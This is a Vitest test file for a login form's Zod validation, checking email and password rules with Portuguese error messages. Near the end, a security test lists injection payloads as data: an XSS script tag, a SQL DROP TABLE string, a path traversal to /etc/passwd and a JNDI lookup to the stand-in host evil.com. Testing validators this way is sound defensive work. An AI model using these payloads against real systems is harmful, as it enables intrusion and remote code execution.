import { describe, it, expect } from 'vitest'
import { z } from 'zod'

// Import the actual schema used in LoginPage
const loginSchema = z.object({
  email: z.string().email('Email inválido'),
  password: z.string().min(6, 'Senha deve ter pelo menos 6 caracteres'),
  rememberMe: z.boolean().optional(),
})

type LoginFormData = z.infer<typeof loginSchema>

// Additional validation schemas for comprehensive testing
const emailSchema = z.string().email()
const passwordSchema = z.string().min(6)
const strongPasswordSchema = z.string()
  .min(8, 'Senha deve ter pelo menos 8 caracteres')
  .regex(/[A-Z]/, 'Senha deve conter pelo menos uma letra maiúscula')
  .regex(/[a-z]/, 'Senha deve conter pelo menos uma letra minúscula')
  .regex(/\d/, 'Senha deve conter pelo menos um número')
  .regex(/[!@#$%^&*(),.?":{}|<>]/, 'Senha deve conter pelo menos um caractere especial')

// Utility functions for validation testing
const validateLoginForm = (data: Partial<LoginFormData>) => {
  try {
    return { success: true, data: loginSchema.parse(data), errors: null }
  } catch (error) {
    if (error instanceof z.ZodError) {
      return { success: false, data: null, errors: error.errors }
    }
    return { success: false, data: null, errors: [{ message: 'Unknown validation error' }] }
  }
}

const validateEmail = (email: string) => {
  try {
    emailSchema.parse(email)
    return { valid: true, error: null }
  } catch (error) {
    return { valid: false, error: error instanceof z.ZodError ? error.errors[0].message : 'Invalid email' }
  }
}

const validatePassword = (password: string, useStrong = false) => {
  try {
    const schema = useStrong ? strongPasswordSchema : passwordSchema
    schema.parse(password)
    return { valid: true, error: null }
  } catch (error) {
    return { valid: false, error: error instanceof z.ZodError ? error.errors[0].message : 'Invalid password' }
  }
}

describe('Authentication Validation - Comprehensive Tests', () => {
  describe('Login Form Validation', () => {
    describe('Valid Cases', () => {
      it('should validate with valid email and password', () => {
        const formData = {
          email: 'test@example.com',
          password: 'password123',
          rememberMe: false
        }

        const result = validateLoginForm(formData)

        expect(result.success).toBe(true)
        expect(result.data).toEqual(formData)
        expect(result.errors).toBe(null)
      })

      it('should validate without rememberMe field', () => {
        const formData = {
          email: 'user@domain.com',
          password: 'validpass'
        }

        const result = validateLoginForm(formData)

        expect(result.success).toBe(true)
        expect(result.data?.email).toBe(formData.email)
        expect(result.data?.password).toBe(formData.password)
        expect(result.data?.rememberMe).toBeUndefined()
      })

      it('should validate with rememberMe true', () => {
        const formData = {
          email: 'admin@company.org',
          password: 'securepassword',
          rememberMe: true
        }

        const result = validateLoginForm(formData)

        expect(result.success).toBe(true)
        expect(result.data?.rememberMe).toBe(true)
      })

      it('should validate with long password', () => {
        const formData = {
          email: 'test@example.com',
          password: 'this-is-a-very-long-password-that-should-still-be-valid-123456789'
        }

        const result = validateLoginForm(formData)

        expect(result.success).toBe(true)
      })

      it('should validate with complex email formats', () => {
        const validEmails = [
          'simple@example.com',
          'user.name@example.com',
          'user+tag@example.com',
          'user_name@example-domain.com',
          'a@b.co',
          'test.email.with+symbol@example.com',
          'x@domain.museum',
          'user@sub.domain.com'
        ]

        validEmails.forEach(email => {
          const result = validateLoginForm({
            email,
            password: 'password123'
          })

          expect(result.success).toBe(true)
        })
      })
    })

    describe('Invalid Cases', () => {
      it('should fail with invalid email formats', () => {
        const invalidEmails = [
          'notanemail',
          'missing@',
          '@missinguser.com',
          'spaces in@email.com',
          'double@@domain.com',
          'user@',
          'user@.com',
          '.user@domain.com',
          'user.@domain.com',
          'user@domain.',
          'user@domain..com'
        ]

        invalidEmails.forEach(email => {
          const result = validateLoginForm({
            email,
            password: 'password123'
          })

          expect(result.success).toBe(false)
          expect(result.errors).toContainEqual(
            expect.objectContaining({
              path: ['email'],
              message: 'Email inválido'
            })
          )
        })
      })

      it('should fail with short passwords', () => {
        const shortPasswords = ['', 'a', 'ab', 'abc', 'abcd', 'abcde']

        shortPasswords.forEach(password => {
          const result = validateLoginForm({
            email: 'test@example.com',
            password
          })

          expect(result.success).toBe(false)
          expect(result.errors).toContainEqual(
            expect.objectContaining({
              path: ['password'],
              message: 'Senha deve ter pelo menos 6 caracteres'
            })
          )
        })
      })

      it('should fail with missing email', () => {
        const result = validateLoginForm({
          password: 'password123'
        })

        expect(result.success).toBe(false)
        expect(result.errors).toContainEqual(
          expect.objectContaining({
            path: ['email']
          })
        )
      })

      it('should fail with missing password', () => {
        const result = validateLoginForm({
          email: 'test@example.com'
        })

        expect(result.success).toBe(false)
        expect(result.errors).toContainEqual(
          expect.objectContaining({
            path: ['password']
          })
        )
      })

      it('should fail with both fields missing', () => {
        const result = validateLoginForm({})

        expect(result.success).toBe(false)
        expect(result.errors).toHaveLength(2)
        expect(result.errors?.some(error => error.path.includes('email'))).toBe(true)
        expect(result.errors?.some(error => error.path.includes('password'))).toBe(true)
      })

      it('should fail with empty strings', () => {
        const result = validateLoginForm({
          email: '',
          password: ''
        })

        expect(result.success).toBe(false)
        expect(result.errors).toHaveLength(2)
      })

      it('should fail with whitespace-only fields', () => {
        const result = validateLoginForm({
          email: '   ',
          password: '   '
        })

        expect(result.success).toBe(false)
        expect(result.errors).toHaveLength(2)
      })
    })

    describe('Edge Cases', () => {
      it('should handle null values', () => {
        const result = validateLoginForm({
          email: null as any,
          password: null as any
        })

        expect(result.success).toBe(false)
        expect(result.errors).toHaveLength(2)
      })

      it('should handle undefined values', () => {
        const result = validateLoginForm({
          email: undefined as any,
          password: undefined as any
        })

        expect(result.success).toBe(false)
        expect(result.errors).toHaveLength(2)
      })

      it('should handle non-string values', () => {
        const result = validateLoginForm({
          email: 123 as any,
          password: true as any
        })

        expect(result.success).toBe(false)
        expect(result.errors).toHaveLength(2)
      })

      it('should handle very long inputs', () => {
        const longEmail = 'a'.repeat(100) + '@' + 'b'.repeat(100) + '.com'
        const longPassword = 'p'.repeat(1000)

        const result = validateLoginForm({
          email: longEmail,
          password: longPassword
        })

        // Should validate structure but may be invalid email
        expect(result.success).toBe(false) // Due to invalid email format
      })

      it('should handle special characters in password', () => {
        const specialCharPasswords = [
          'pass@123',
          'test!password',
          'my#secure$pass',
          'çomplëx-pāsswörd',
          'emoji😀password',
          'unicode™password',
          'multi\nline\npassword'
        ]

        specialCharPasswords.forEach(password => {
          const result = validateLoginForm({
            email: 'test@example.com',
            password
          })

          if (password.length >= 6) {
            expect(result.success).toBe(true)
          }
        })
      })
    })
  })

  describe('Email Validation', () => {
    describe('Valid Email Formats', () => {
      it('should validate standard email formats', () => {
        const validEmails = [
          'user@domain.com',
          'first.last@subdomain.domain.com',
          'user+tag@domain.com',
          'user_name@domain-name.com',
          'user123@domain123.com',
          'a@b.co',
          'test@domain.travel'
        ]

        validEmails.forEach(email => {
          const result = validateEmail(email)
          expect(result.valid).toBe(true)
          expect(result.error).toBe(null)
        })
      })

      it('should validate international domain names', () => {
        const internationalEmails = [
          'user@domain.co.uk',
          'test@domain.com.br',
          'user@domain.gov.au',
          'contact@domain.edu'
        ]

        internationalEmails.forEach(email => {
          const result = validateEmail(email)
          expect(result.valid).toBe(true)
        })
      })

      it('should validate emails with numbers', () => {
        const numericEmails = [
          'user123@domain.com',
          '123user@domain.com',
          'user@domain123.com',
          '123@456.com'
        ]

        numericEmails.forEach(email => {
          const result = validateEmail(email)
          expect(result.valid).toBe(true)
        })
      })
    })

    describe('Invalid Email Formats', () => {
      it('should reject malformed emails', () => {
        const invalidEmails = [
          'plainaddress',
          '@missinguser.com',
          'missing.domain@.com',
          'missing@domain',
          'spaces in@email.com',
          'double@@domain.com',
          'user@domain..com',
          '.user@domain.com',
          'user.@domain.com'
        ]

        invalidEmails.forEach(email => {
          const result = validateEmail(email)
          expect(result.valid).toBe(false)
          expect(result.error).toBeTruthy()
        })
      })
    })
  })

  describe('Password Validation', () => {
    describe('Basic Password Requirements', () => {
      it('should validate minimum length passwords', () => {
        const validPasswords = [
          'abcdef',
          '123456',
          'password',
          'longer-password-here'
        ]

        validPasswords.forEach(password => {
          const result = validatePassword(password)
          expect(result.valid).toBe(true)
          expect(result.error).toBe(null)
        })
      })

      it('should reject short passwords', () => {
        const shortPasswords = ['', 'a', 'ab', 'abc', 'abcd', 'abcde']

        shortPasswords.forEach(password => {
          const result = validatePassword(password)
          expect(result.valid).toBe(false)
          expect(result.error).toBeTruthy()
        })
      })
    })

    describe('Strong Password Requirements', () => {
      it('should validate strong passwords', () => {
        const strongPasswords = [
          'Password123!',
          'MyStrong@Pass1',
          'Complex#Password9',
          'Secure&Pass123',
          'Valid!Password8'
        ]

        strongPasswords.forEach(password => {
          const result = validatePassword(password, true)
          expect(result.valid).toBe(true)
          expect(result.error).toBe(null)
        })
      })

      it('should reject passwords without uppercase letters', () => {
        const passwords = [
          'password123!',
          'lowercase@123',
          'no-upper-case1!'
        ]

        passwords.forEach(password => {
          const result = validatePassword(password, true)
          expect(result.valid).toBe(false)
          expect(result.error).toContain('maiúscula')
        })
      })

      it('should reject passwords without lowercase letters', () => {
        const passwords = [
          'PASSWORD123!',
          'UPPERCASE@123',
          'NO-LOWER-CASE1!'
        ]

        passwords.forEach(password => {
          const result = validatePassword(password, true)
          expect(result.valid).toBe(false)
          expect(result.error).toContain('minúscula')
        })
      })

      it('should reject passwords without numbers', () => {
        const passwords = [
          'Password!',
          'NoNumbers@',
          'OnlyLetters#'
        ]

        passwords.forEach(password => {
          const result = validatePassword(password, true)
          expect(result.valid).toBe(false)
          expect(result.error).toContain('número')
        })
      })

      it('should reject passwords without special characters', () => {
        const passwords = [
          'Password123',
          'NoSpecialChars1',
          'OnlyAlphaNum9'
        ]

        passwords.forEach(password => {
          const result = validatePassword(password, true)
          expect(result.valid).toBe(false)
          expect(result.error).toContain('especial')
        })
      })

      it('should reject passwords that are too short for strong validation', () => {
        const shortPasswords = [
          'Pass1!',
          'Abc123#',
          'Xy9@'
        ]

        shortPasswords.forEach(password => {
          const result = validatePassword(password, true)
          expect(result.valid).toBe(false)
          expect(result.error).toContain('8 caracteres')
        })
      })
    })

    describe('Password Edge Cases', () => {
      it('should handle passwords with unicode characters', () => {
        const unicodePasswords = [
          'Pāsswörd123!',
          'Contraseña123@',
          'Пароль123#',
          'パスワード123$'
        ]

        unicodePasswords.forEach(password => {
          const result = validatePassword(password)
          expect(result.valid).toBe(true)
        })
      })

      it('should handle passwords with whitespace', () => {
        const whitespacePasswords = [
          'pass word',
          ' password123',
          'password123 ',
          'my password'
        ]

        whitespacePasswords.forEach(password => {
          const result = validatePassword(password)
          if (password.length >= 6) {
            expect(result.valid).toBe(true)
          }
        })
      })

      it('should handle extremely long passwords', () => {
        const longPassword = 'P@ssw0rd' + 'a'.repeat(1000)

        const result = validatePassword(longPassword, true)
        expect(result.valid).toBe(true)
      })
    })
  })

  describe('Form Data Sanitization', () => {
    it('should handle form data with extra properties', () => {
      const formDataWithExtras = {
        email: 'test@example.com',
        password: 'password123',
        rememberMe: true,
        extraField: 'should be ignored',
        anotherExtra: 123
      }

      const result = validateLoginForm(formDataWithExtras)

      expect(result.success).toBe(true)
      expect(result.data).toEqual({
        email: 'test@example.com',
        password: 'password123',
        rememberMe: true
      })
    })

    it('should trim whitespace from strings', () => {
      const formDataWithWhitespace = {
        email: '  test@example.com  ',
        password: '  password123  '
      }

      // Note: Zod doesn't automatically trim, so we need to test the behavior
      const result = validateLoginForm(formDataWithWhitespace)

      // This would fail with current schema, but in a real app you might want to add trim()
      expect(result.success).toBe(false) // Because email with spaces is invalid
    })
  })

  describe('Validation Error Messages', () => {
    it('should provide clear error messages in Portuguese', () => {
      const result = validateLoginForm({
        email: 'invalid-email',
        password: 'short'
      })

      expect(result.success).toBe(false)
      expect(result.errors).toContainEqual(
        expect.objectContaining({
          message: 'Email inválido'
        })
      )
      expect(result.errors).toContainEqual(
        expect.objectContaining({
          message: 'Senha deve ter pelo menos 6 caracteres'
        })
      )
    })

    it('should provide field-specific error paths', () => {
      const result = validateLoginForm({
        email: 'invalid',
        password: '123'
      })

      expect(result.success).toBe(false)

      const emailError = result.errors?.find(error => error.path.includes('email'))
      const passwordError = result.errors?.find(error => error.path.includes('password'))

      expect(emailError).toBeDefined()
      expect(passwordError).toBeDefined()
      expect(emailError?.path).toEqual(['email'])
      expect(passwordError?.path).toEqual(['password'])
    })
  })

  describe('Validation Performance', () => {
    it('should validate quickly with valid input', () => {
      const startTime = performance.now()

      for (let i = 0; i < 1000; i++) {
        validateLoginForm({
          email: `user${i}@domain.com`,
          password: `password${i}`
        })
      }

      const endTime = performance.now()
      const duration = endTime - startTime

      // Should validate 1000 forms in less than 100ms
      expect(duration).toBeLessThan(100)
    })

    it('should handle validation errors efficiently', () => {
      const startTime = performance.now()

      for (let i = 0; i < 1000; i++) {
        validateLoginForm({
          email: 'invalid-email',
          password: 'short'
        })
      }

      const endTime = performance.now()
      const duration = endTime - startTime

      // Should handle errors efficiently
      expect(duration).toBeLessThan(200)
    })
  })

  describe('Security Considerations', () => {
    it('should not expose sensitive information in validation errors', () => {
      const result = validateLoginForm({
        email: 'test@example.com',
        password: 'user-secret-password-that-should-not-appear-in-errors'
      })

      // Even if validation fails, password should not appear in error messages
      const errorMessages = result.errors?.map(error => error.message).join(' ') || ''
      expect(errorMessages).not.toContain('user-secret-password')
    })

    it('should handle potential injection attempts', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>@domain.com',
        'user@domain.com<script>',
        'DROP TABLE users; --',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ]

      maliciousInputs.forEach(input => {
        const result = validateLoginForm({
          email: input,
          password: 'password123'
        })

        // Should either validate as harmless string or fail validation
        // But should not cause any errors or exceptions
        expect(typeof result.success).toBe('boolean')
      })
    })
  })

  describe('Integration with Form Libraries', () => {
    it('should work with react-hook-form resolver pattern', () => {
      // Simulate how the schema would be used with react-hook-form
      const resolver = (data: any) => {
        const result = validateLoginForm(data)

        if (result.success) {
          return { values: result.data, errors: {} }
        }

        const errors: Record<string, any> = {}
        result.errors?.forEach(error => {
          const path = error.path.join('.')
          errors[path] = { message: error.message }
        })

        return { values: {}, errors }
      }

      const validResult = resolver({
        email: 'test@example.com',
        password: 'password123'
      })

      expect(validResult.errors).toEqual({})
      expect(validResult.values).toBeDefined()

      const invalidResult = resolver({
        email: 'invalid',
        password: 'short'
      })

      expect(Object.keys(invalidResult.errors)).toContain('email')
      expect(Object.keys(invalidResult.errors)).toContain('password')
    })
  })
})